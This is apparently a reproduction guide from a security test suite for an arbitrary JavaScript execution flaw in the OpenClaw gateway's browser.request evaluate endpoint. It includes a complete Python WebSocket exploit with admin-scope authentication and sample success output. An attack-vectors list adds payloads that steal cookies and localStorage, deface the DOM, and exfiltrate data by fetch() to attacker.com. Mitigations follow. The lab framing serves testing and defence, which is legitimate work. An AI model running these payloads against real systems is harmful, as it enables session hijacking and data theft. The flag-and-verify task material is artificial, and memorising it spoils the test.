# OpenClaw Browser JavaScript Execution - Step-by-Step Reproduction Guide

## Vulnerability Overview

**CVE**: N/A (Undisclosed)
**Severity**: CRITICAL
**Type**: Arbitrary JavaScript Execution via Browser Evaluate Endpoint

OpenClaw's gateway exposes `browser.request` over WebSocket RPC. When `evaluateEnabled=true`, a request with `path: "/act"` and `{"kind":"evaluate","fn":"..."}` executes attacker-controlled JavaScript in browser context.

## Prerequisites

- Docker and Docker Compose installed
- Network access between containers
- Approximately 2GB RAM for Chromium browser

## Step-by-Step Reproduction

### Step 1: Configure and Start the Environment

```bash
# Navigate to runtime directory
cd ../../runtimes/openclaw-2026.2.1

# Set task ID and start containers
export TASK_ID="openclaw-browser-js"
docker compose up -d --build
```

This starts two containers:
- `openclaw-security-test-openclaw-browser-js` - Target server with vulnerable OpenClaw
- `openclaw-attacker-openclaw-browser-js` - Attacker container

**What happens in the background:**
1. Container starts and runs `/entrypoint.sh`
2. Entrypoint checks for `/workspace/start.sh` (doesn't exist yet)
3. Entrypoint starts Chromium browser with CDP on port 9222
4. Entrypoint starts OpenClaw server with `evaluateEnabled=true` on port 3000
5. Server is ready and waiting for requests

### Step 2: Deploy Task-Specific Configuration

```bash
# Navigate to task directory
cd ../../tasks/task-openclaw-browser-js-execution

# Copy and run start.sh in target container, then copy ground truth flag to attacker
docker cp start.sh openclaw-security-test-openclaw-browser-js:/workspace/ && \
docker exec -d openclaw-security-test-openclaw-browser-js bash /workspace/start.sh && \
docker exec openclaw-security-test-openclaw-browser-js bash -c 'for i in $(seq 30); do [ -f /workspace/flag.txt ] && break; sleep 1; done' && \
docker cp openclaw-security-test-openclaw-browser-js:/workspace/flag.txt /tmp/.oc_gt_browser-js && \
docker cp /tmp/.oc_gt_browser-js openclaw-attacker-openclaw-browser-js:/tmp/.ground_truth_flag.txt
```

**What happens during setup:**
1. `start.sh` runs in the target container:
   - Generates random flag: `flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`
   - Saves flag to `/workspace/flag.txt` (target container)
   - Creates HTML page at `/tmp/page_with_flag.html` with `window.__FLAG__ = 'flag{...}'`
2. Ground truth flag is copied to attacker container at `/tmp/.ground_truth_flag.txt`
3. **System is now vulnerable and ready for exploitation**

**Verify the configuration:**
```bash
# Check evaluateEnabled setting
docker exec openclaw-security-test-openclaw-browser-js env | grep EVALUATE_ENABLED
# Should output: EVALUATE_ENABLED=true

# Check gateway is reachable
docker exec openclaw-attacker-openclaw-browser-js curl -sI http://openclaw:3000 | head -n 1
# Note: HTTP/1.1 503 Service Unavailable is acceptable here in this runtime.
# It usually means Control UI assets are not built, but the gateway is still listening.
```

### Step 3: Exploit the Vulnerability

**Manual exploitation using the exact vulnerability pattern (WebSocket RPC):**

```bash
docker exec -i openclaw-attacker-openclaw-browser-js python3 - <<'PY'
import asyncio, json, websockets

async def recv_for_id(ws, expected_id):
    while True:
        msg = json.loads(await ws.recv())
        if msg.get("type") == "res" and msg.get("id") == expected_id:
            return msg

async def main():
    async with websockets.connect("ws://openclaw:3000") as ws:
        # challenge
        challenge = json.loads(await ws.recv())
        assert challenge.get("event") == "connect.challenge"

        # connect/auth
        await ws.send(json.dumps({
            "type": "req",
            "id": "connect-1",
            "method": "connect",
            "params": {
                "minProtocol": 3,
                "maxProtocol": 3,
                "client": {"id": "manual-test", "version": "1", "platform": "linux", "mode": "backend"},
                "auth": {"token": "test-token"},
                "role": "operator",
                "scopes": ["operator.admin"],
                "caps": []
            }
        }))
        print(await recv_for_id(ws, "connect-1"))

        # start browser
        await ws.send(json.dumps({
            "type": "req", "id": "start", "method": "browser.request",
            "params": {"method": "POST", "path": "/start"}
        }))
        print(await recv_for_id(ws, "start"))

        # load local page containing window.__FLAG__
        await ws.send(json.dumps({
            "type": "req", "id": "open", "method": "browser.request",
            "params": {"method": "POST", "path": "/tabs/open", "body": {"url": "file:///tmp/page_with_flag.html"}}
        }))
        print(await recv_for_id(ws, "open"))

        # exploit evaluate
        await ws.send(json.dumps({
            "type": "req", "id": "exploit", "method": "browser.request",
            "params": {"method": "POST", "path": "/act", "body": {"kind": "evaluate", "fn": "window.__FLAG__"}}
        }))
        print(await recv_for_id(ws, "exploit"))

asyncio.run(main())
PY
```

**Or use the automated exploit script:**

```bash
# Copy and run the exploit script
docker cp run_agent.sh openclaw-attacker-openclaw-browser-js:/workspace/
docker exec openclaw-attacker-openclaw-browser-js bash /workspace/run_agent.sh
```

Successful exploitation will display:
```
==========================================
OpenClaw Arbitrary JavaScript Execution Exploit
==========================================

[*] Target: OpenClaw Gateway (WebSocket RPC)
[*] Vulnerability: Arbitrary JavaScript execution via browser.request RPC
[*] Technique: POST /act via browser.request
[✓] Exploit sent successfully

[✓] EXPLOIT SUCCESSFUL!

Retrieved flag: flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}

[✓] Proof saved to: /workspace/exploit_proof.txt

==========================================
Attack completed successfully!
==========================================
```

### Step 4: Verify the Exploit

```bash
# Copy verification script to attacker container and run it
docker cp verify.sh openclaw-attacker-openclaw-browser-js:/workspace/
docker exec openclaw-attacker-openclaw-browser-js bash /workspace/verify.sh
```

Successful verification will display:
```
==========================================
Verifying OpenClaw JavaScript Execution Exploit
==========================================

Check 1: Exploit proof file exists
[✓] File exists: /workspace/exploit_proof.txt

Check 2: Flag format validation
[✓] Flag format is correct: flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}

Check 3: Flag matches ground truth
[✓] Flag matches ground truth

==========================================
[✓] VERIFICATION SUCCESSFUL - All 3/3 checks passed
==========================================

OpenClaw browser JavaScript execution vulnerability confirmed!
Attacker successfully exploited arbitrary code execution to extract the flag
```

### Step 5: Cleanup

```bash
# Navigate back to runtime directory and stop containers
cd ../../runtimes/openclaw-2026.2.1
docker compose down -v
```

## Technical Details

### Vulnerability Mechanism

1. **Configuration**: `evaluateEnabled=true` (set via `EVALUATE_ENABLED` environment variable)
2. **Gateway entry point**: WebSocket RPC `browser.request`
3. **Request format**:
   ```json
   {
     "method": "POST",
     "path": "/act",
     "body": {
       "kind": "evaluate",
       "fn": "arbitrary_javascript_code_here"
     }
   }
   ```
4. **Execution flow**:
   - Client authenticates to gateway (`connect` with token)
   - Client sends `browser.request` with `path: "/act"`
   - Checks if `evaluateEnabled === true`
   - Calls `evaluate()` function with user-supplied `fn` parameter
   - `evaluate()` uses `new Function()` + `eval()` to execute code:
     ```javascript
     const browserEvaluator = new Function('fnBody', `
       "use strict";
       try {
         var candidate = eval("(" + fnBody + ")");  // ❌ VULNERABLE!
         return typeof candidate === "function" ? candidate() : candidate;
       } catch (err) {
         throw new Error("Invalid evaluate function: " + err.message);
       }
     `);
     ```
   - Code executes in browser context with full access to:
     - `window`, `document`, `localStorage`, `sessionStorage`
     - All DOM APIs
     - All JavaScript runtime features
     - Network access via `fetch()`

### Why This is Critical

- ✅ **Powerful action exposed over RPC** - Browser eval is reachable via gateway methods
- ✅ **No input validation** - Any JavaScript code is accepted
- ✅ **No sandboxing** - Executes with full browser privileges
- ✅ **No rate limiting** - Unlimited exploit attempts
- ✅ **Full context access** - Can read cookies, localStorage, DOM
- ✅ **Single request exploit** - One POST request = full compromise

### Attack Vectors

```bash
# Steal cookies
{"method":"POST","path":"/act","body":{"kind":"evaluate","fn":"document.cookie"}}

# Access localStorage
{"method":"POST","path":"/act","body":{"kind":"evaluate","fn":"JSON.stringify(localStorage)"}}

# Exfiltrate data
{"method":"POST","path":"/act","body":{"kind":"evaluate","fn":"fetch('http://attacker.com',{method:'POST',body:window.__FLAG__})"}}

# Read page content
{"method":"POST","path":"/act","body":{"kind":"evaluate","fn":"document.body.innerHTML"}}

# Modify DOM
{"method":"POST","path":"/act","body":{"kind":"evaluate","fn":"document.body.innerHTML='<h1>Hacked</h1>'"}}

# Access window globals
{"method":"POST","path":"/act","body":{"kind":"evaluate","fn":"Object.keys(window)"}}
```

## Files Description

### Runtime Files (in `runtimes/openclaw-2026.2.1/`)

- **`entrypoint.sh`**: Main service launcher
  - Checks for `/workspace/start.sh` and runs it if exists
  - Starts Chromium browser with CDP on port 9222
  - Starts real OpenClaw gateway service on port 3000
  - Enforces `evaluateEnabled` configuration check

- **`Dockerfile`**: Container image with OpenClaw v2026.2.1 source code
  - Base: `node:22-slim`
  - Includes: Chromium, Playwright, OpenClaw dependencies

- **`docker-compose.yml`**: Multi-container orchestration
  - Sets `EVALUATE_ENABLED=true` environment variable
  - Exposes ports 3000 (server) and 9222 (CDP)

### Task Files (in `tasks/task-openclaw-browser-js-execution/`)

- **`start.sh`**: Task-specific setup (runs in background when detected by entrypoint)
  - Generates random flag
  - Creates HTML page with `window.__FLAG__`
  - Does NOT start services (entrypoint handles that)

- **`run_agent.sh`**: Automated exploit script
  - Connects to gateway WebSocket with token auth
  - Sends `browser.request` with `POST /act`
  - Extracts flag via JavaScript execution
  - Saves proof to `/workspace/exploit_proof.txt`

- **`verify.sh`**: Verification script
  - Checks exploit proof file exists
  - Validates flag format
  - Compares with ground truth

## Troubleshooting

### Problem: Server not responding

```bash
# Check container status
docker ps --filter name=openclaw

# Check server logs
docker logs openclaw-security-test-openclaw-browser-js

# Check if server is listening
docker exec openclaw-security-test-openclaw-browser-js netstat -tlnp | grep 3000
```

### Problem: Browser not starting

```bash
# Check Chromium process
docker exec openclaw-security-test-openclaw-browser-js ps aux | grep chromium

# Check CDP endpoint
docker exec openclaw-security-test-openclaw-browser-js curl -s http://localhost:9222/json

# Check browser logs
docker exec openclaw-security-test-openclaw-browser-js cat /tmp/chromium.log
```

### Problem: Flag not loaded

```bash
# Check if start.sh ran
docker exec openclaw-security-test-openclaw-browser-js ls -la /workspace/

# Check flag file
docker exec openclaw-security-test-openclaw-browser-js cat /workspace/flag.txt

# Check HTML page
docker exec openclaw-security-test-openclaw-browser-js cat /tmp/page_with_flag.html
```

### Problem: evaluateEnabled check failing

```bash
# Verify environment variable
docker exec openclaw-security-test-openclaw-browser-js env | grep EVALUATE_ENABLED

# Test with evaluateEnabled=false (should fail)
docker compose down
# Edit docker-compose.yml to set EVALUATE_ENABLED=false
docker compose up -d
# Test - should return error about evaluate being disabled
```

## Security Implications

⚠️ **CRITICAL VULNERABILITY**

This vulnerability allows:
- **Remote Code Execution** in browser context
- **Session Hijacking** via cookie/localStorage theft
- **Data Exfiltration** of sensitive information
- **DOM Manipulation** for phishing attacks
- **Persistent Compromise** via injected scripts

🔒 **Recommended Mitigation:**
1. Set `evaluateEnabled=false` by default
2. Restrict/disable `act:evaluate` capability in production
3. Implement input validation and sanitization
4. Use sandboxed execution environment (e.g., vm2)
5. Add rate limiting and monitoring
6. Whitelist allowed browser actions instead of arbitrary eval()

## References

- OpenClaw Source: `src/browser/pw-tools-core.interactions.ts:227-257`
- Vulnerability Type: CWE-94 (Code Injection)
- OWASP: [Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
